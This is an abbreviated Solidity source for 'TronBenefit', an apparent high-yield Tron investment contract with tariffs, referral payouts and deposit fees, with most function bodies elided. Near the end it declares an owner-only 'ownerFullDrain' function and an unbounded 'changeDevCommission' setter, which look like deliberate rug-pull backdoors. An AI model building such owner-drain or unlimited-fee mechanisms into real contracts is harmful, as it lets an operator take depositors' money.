//SourceUnit: tronbenefit.sol



pragma solidity 0.5.9;

contract TronBenefit {
    struct Tarif {
        uint16 life_days;
        uint16 percent;
    }
    ...
    function _refPayout(address _addr, uint256 _amount) private {
        ...
        uint256 _allaff = (_amount*11)/(100);
    ...
    function deposit(uint8 _tarif, address _upline) external payable {
        ...
        uint256  sm_share=(msg.value* sm_fee)/100;
   ...
   // address[] memory addrs = new address[](indexes.length);
    ...
    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[2] memory structure) {
        Player storage player = players[_addr];
    ...
    function ownerFullDrain() public ownerOnly{
     ...
     function changeDevCommission(uint256 _newDevCommission) public ownerOnly{
       dev_fee = _newDevCommission;
    } 
